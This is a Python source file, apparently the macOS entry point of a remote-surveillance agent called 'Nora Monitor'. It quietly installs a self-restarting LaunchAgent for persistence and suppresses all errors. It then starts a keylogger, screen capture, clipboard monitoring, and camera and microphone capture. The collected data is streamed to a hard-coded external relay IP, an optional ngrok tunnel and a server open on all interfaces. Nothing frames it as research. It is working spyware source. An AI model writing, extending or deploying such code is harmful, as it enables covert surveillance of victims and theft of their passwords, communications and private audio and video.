"""
Nora Monitor — macOS agent entry point.
Installs a LaunchAgent for persistence, then starts all monitors.
"""
import os
import sys
import time
import threading
import platform
import socket
import plistlib
from pathlib import Path

# ── resolve resource paths (frozen .app or plain script) ────────────────────
def _res(rel):
    base = sys._MEIPASS if getattr(sys, "frozen", False) else os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base, rel)


# ── LaunchAgent persistence ──────────────────────────────────────────────────
_PLIST_LABEL = "com.nora.monitor"
_PLIST_PATH  = Path.home() / "Library" / "LaunchAgents" / f"{_PLIST_LABEL}.plist"

def _install_launchagent():
    try:
        exe = sys.executable if not getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
        plist = {
            "Label":            _PLIST_LABEL,
            "ProgramArguments": [exe],
            "RunAtLoad":        True,
            "KeepAlive":        True,
            "StandardOutPath":  str(Path.home() / "Library" / "Logs" / "nora_monitor.log"),
            "StandardErrorPath":str(Path.home() / "Library" / "Logs" / "nora_monitor.log"),
        }
        _PLIST_PATH.parent.mkdir(parents=True, exist_ok=True)
        with open(_PLIST_PATH, "wb") as f:
            plistlib.dump(plist, f)
        os.system(f"launchctl load -w '{_PLIST_PATH}' 2>/dev/null")
    except Exception:
        pass


# ── relay URL ────────────────────────────────────────────────────────────────
_RELAY = os.environ.get("NORA_RELAY", "http://16.55.3.205:5000")
_PORT  = int(os.environ.get("NORA_PORT", "9090"))


def main():
    _install_launchagent()

    import server
    import screencap
    import keylogger
    import clipboard_monitor
    import relay_client
    import camera as cam_mod
    import microphone as mic_mod

    # ── camera ───────────────────────────────────────────────────────────────
    camera = cam_mod.Camera(on_frame=server.broadcast_camera)

    # ── microphone ───────────────────────────────────────────────────────────
    mic = mic_mod.Microphone(on_audio=server.broadcast_audio)

    # ── init server ──────────────────────────────────────────────────────────
    import controller
    server.init(controller.handle_command, None, camera, mic)

    # ── screen capture ───────────────────────────────────────────────────────
    screencap.start(server.broadcast_frame)

    # ── keylogger ────────────────────────────────────────────────────────────
    keylogger.start(server.broadcast_key)

    # ── clipboard monitor ────────────────────────────────────────────────────
    clipboard_monitor.start(server.broadcast_clipboard)

    # ── relay client (background) ────────────────────────────────────────────
    threading.Thread(
        target=relay_client.connect,
        args=(_RELAY,),
        daemon=True,
    ).start()

    # ── ngrok (optional) ─────────────────────────────────────────────────────
    try:
        import ngrok_helper
        threading.Thread(
            target=ngrok_helper.start,
            args=(_PORT, server.broadcast_ngrok_url),
            daemon=True,
        ).start()
    except Exception:
        pass

    # ── Flask-SocketIO (blocks) ───────────────────────────────────────────────
    server.run(host="0.0.0.0", port=_PORT)


if __name__ == "__main__":
    main()
